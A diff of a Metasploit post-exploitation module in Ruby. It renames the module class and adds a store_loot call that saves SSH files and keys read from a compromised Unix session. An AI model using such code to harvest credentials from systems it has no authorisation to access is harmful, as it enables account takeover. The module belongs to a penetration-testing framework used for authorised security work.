@@ -7,7 +7,7 @@ require 'msf/core'
 require 'rex'
 require 'sshkey'
 
-class Metasploit3 < Msf::Post
+class MetasploitModule < Msf::Post
 
   include Msf::Post::File
   include Msf::Post::Unix
@@ -61,7 +61,8 @@ class Metasploit3 < Msf::Post
         data = read_file("#{path}#{sep}#{file}")
         file = file.split(sep).last
 
-        print_good("Downloaded #{path}#{sep}#{file}")
+        loot_path = store_loot("ssh.#{file}", "text/plain", session, data, "ssh_#{file}", "OpenSSH #{file} File")
+        print_good("Downloaded #{path}#{sep}#{file} -> #{loot_path}")
 
         begin
           key = SSHKey.new(data, :passphrase => "")
